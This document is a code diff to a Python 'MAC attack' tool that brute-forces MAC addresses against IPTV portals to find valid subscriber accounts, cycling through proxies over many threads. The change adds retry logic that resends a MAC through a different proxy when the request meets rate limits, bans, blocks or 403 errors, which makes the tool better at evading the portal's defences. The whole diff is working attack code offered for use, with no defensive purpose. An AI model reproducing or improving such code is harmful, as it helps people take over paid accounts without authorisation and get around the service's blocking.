@@ -643,7 +643,7 @@ def api_attack_clear():
 
 
 def run_attack(portal_id):
-    """Run the MAC attack for a specific portal."""
+    """Run the MAC attack for a specific portal - with retry logic like original MacAttack."""
     global proxy_error_counts
     
     with attack_states_lock:
@@ -659,6 +659,9 @@ def run_attack(portal_id):
     mac_prefix = settings.get("mac_prefix", "00:1A:79:")
     mode = state.get("mode", "random")
     max_proxy_errors = settings.get("max_proxy_errors", MAX_PROXY_ERRORS)
+    
+    # Max retries per MAC when proxy fails (to avoid infinite loops)
+    MAX_MAC_RETRIES = 3
     
     proxies = config.get("proxies", []) if use_proxies else []
     proxy_index = 0
@@ -681,6 +684,11 @@ def run_attack(portal_id):
         mac_list = []
     
     mac_list_index = 0
+    
+    # Track retry counts per MAC (to avoid infinite loops)
+    mac_retry_counts = defaultdict(int)
+    # Queue for MACs that need retry due to proxy errors
+    retry_queue = []
     
     # Log mode and MAC list info
     add_log(state, f"Attack started with {speed} threads, mode: {mode}", "info")
@@ -718,7 +726,7 @@ def run_attack(portal_id):
                 break
             
             # Check if we should stop adding new MACs (list or refresh mode)
-            if mode in ("list", "refresh") and mac_list_index >= len(mac_list):
+            if mode in ("list", "refresh") and mac_list_index >= len(mac_list) and not retry_queue:
                 if not list_exhausted:
                     add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting for results...", "info")
                     list_exhausted = True
@@ -728,9 +736,16 @@ def run_attack(portal_id):
                     break
             
             # Add new MACs to test (only if list not exhausted or random mode)
-            if not list_exhausted:
+            if not list_exhausted or retry_queue:
                 while len(futures) < speed and state["running"]:
-                    if mode in ("list", "refresh"):
+                    mac = None
+                    is_retry = False
+                    
+                    # First check retry queue (MACs that failed due to proxy errors)
+                    if retry_queue:
+                        mac = retry_queue.pop(0)
+                        is_retry = True
+                    elif mode in ("list", "refresh"):
                         if mac_list_index >= len(mac_list):
                             break
                         mac = mac_list[mac_list_index]
@@ -738,6 +753,9 @@ def run_attack(portal_id):
                         state["mac_list_index"] = mac_list_index
                     else:
                         mac = generate_mac(mac_prefix)
+                    
+                    if not mac:
+                        break
                     
                     proxy = None
                     if proxies:
@@ -752,7 +770,8 @@ def run_attack(portal_id):
                     
                     # Log that we're testing this MAC
                     proxy_info = f" via {proxy}" if proxy else ""
-                    add_log(state, f"Testing {mac}{proxy_info}", "info")
+                    retry_info = f" (retry {mac_retry_counts[mac]})" if is_retry else ""
+                    add_log(state, f"Testing {mac}{proxy_info}{retry_info}", "info")
                     
                     future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                     futures[future] = (mac, proxy)
@@ -829,23 +848,58 @@ def run_attack(portal_id):
                         
                         if settings.get("auto_save", True):
                             save_config()
+                        
+                        # Clear retry count on success
+                        if mac in mac_retry_counts:
+                            del mac_retry_counts[mac]
                     else:
                         add_log(state, f"✗ {mac} - No valid account{proxy_info}", "info")
+                        # Clear retry count - MAC was tested successfully (just no valid account)
+                        if mac in mac_retry_counts:
+                            del mac_retry_counts[mac]
                     
                 except Exception as e:
-                    state["tested"] += 1
-                    state["errors"] += 1
                     error_msg = str(e).lower()
                     proxy_info = f" via {proxy}" if proxy else ""
-                    if "timeout" in error_msg or "connection" in error_msg or "proxy" in error_msg or "socks" in error_msg:
+                    
+                    # Check if this is a proxy-related error (like original MacAttack)
+                    is_proxy_error = any(x in error_msg for x in [
+                        "timeout", "connection", "proxy", "socks", "403", "forbidden",
+                        "refused", "unreachable", "reset", "closed", "ssl", "certificate",
+                        "503", "502", "504", "rate", "limit", "banned", "blocked"
+                    ])
+                    
+                    if is_proxy_error and proxy:
+                        # Mark proxy error
                         mark_proxy_error(proxy, is_connection_error=True)
                         error_count = proxy_error_counts.get(proxy, 0)
+                        
                         if error_count >= max_proxy_errors:
                             add_log(state, f"🚫 Proxy disabled (too many errors): {proxy}", "error")
                         else:
                             add_log(state, f"⚠ Proxy error ({error_count}/{max_proxy_errors}): {proxy} - {str(e)[:40]}", "warning")
+                        
+                        # Retry MAC with different proxy (like original MacAttack behavior)
+                        # Only retry if we haven't exceeded max retries for this MAC
+                        mac_retry_counts[mac] += 1
+                        if mac_retry_counts[mac] < MAX_MAC_RETRIES:
+                            # Add to retry queue - will be tested with a different proxy
+                            retry_queue.append(mac)
+                            add_log(state, f"🔄 Queuing {mac} for retry ({mac_retry_counts[mac]}/{MAX_MAC_RETRIES})", "info")
+                            # Don't count as tested yet - will be retried
+                        else:
+                            # Max retries reached - count as error
+                            state["tested"] += 1
+                            state["errors"] += 1
+                            add_log(state, f"✗ {mac} - Max retries reached, skipping", "error")
+                            del mac_retry_counts[mac]
                     else:
+                        # Non-proxy error - count as tested
+                        state["tested"] += 1
+                        state["errors"] += 1
                         add_log(state, f"✗ Error: {mac} - {str(e)[:50]}", "error")
+                        if mac in mac_retry_counts:
+                            del mac_retry_counts[mac]
             
             time.sleep(0.05)
     
